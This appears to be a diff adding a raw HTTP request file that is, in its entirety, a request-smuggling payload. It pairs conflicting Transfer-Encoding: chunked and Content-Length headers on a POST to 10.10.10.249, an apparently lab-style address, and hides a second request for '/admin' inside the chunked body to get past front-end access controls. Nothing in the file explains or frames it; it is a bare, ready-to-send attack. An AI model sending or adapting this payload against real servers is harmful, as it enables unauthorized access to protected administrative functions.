@@ -1,0 +1,11 @@
+POST http://10.10.10.249/images/fav_icon.png HTTP/1.1
+Transfer-Encoding: chunked
+Content-Length: 4
+Host: 10.10.10.249
+
+26
+GET /admin HTTP/1.1
+Host: 10.10.10.249
+0
+
+
